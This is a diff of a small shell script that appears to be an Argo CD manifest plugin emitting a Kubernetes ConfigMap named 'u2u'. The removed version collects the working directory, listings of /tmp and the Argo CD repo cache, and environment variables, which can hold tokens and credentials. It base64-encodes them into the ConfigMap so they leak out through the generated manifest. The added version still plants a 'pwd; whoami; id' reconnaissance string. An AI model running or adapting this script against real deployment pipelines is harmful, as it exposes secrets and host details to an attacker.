@@ -1,24 +1,8 @@
 #!/bin/sh
-RECON=$( (
-echo "===CWD==="
-pwd
-echo "===ARG==="
-echo "args: $@"
-echo "===LS_CWD==="
-ls -la
-echo "===REPO_HASH_DIR==="
-ls -la /tmp/_argocd-repo/ 2>/dev/null
-echo "===TMP==="
-ls -la /tmp/ 2>/dev/null | head -20
-echo "===ENV==="
-env | sort | head -30
-) | base64 | tr -d '\n' )
-cat << EOF
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: u2u
-data:
-  result: $RECON
-EOF
+echo "apiVersion: v1"
+echo "kind: ConfigMap"
+echo "metadata:"
+echo "  name: u2u"
+echo "data:"
+echo "  result: \$( pwd; whoami; id )"
 exit 0
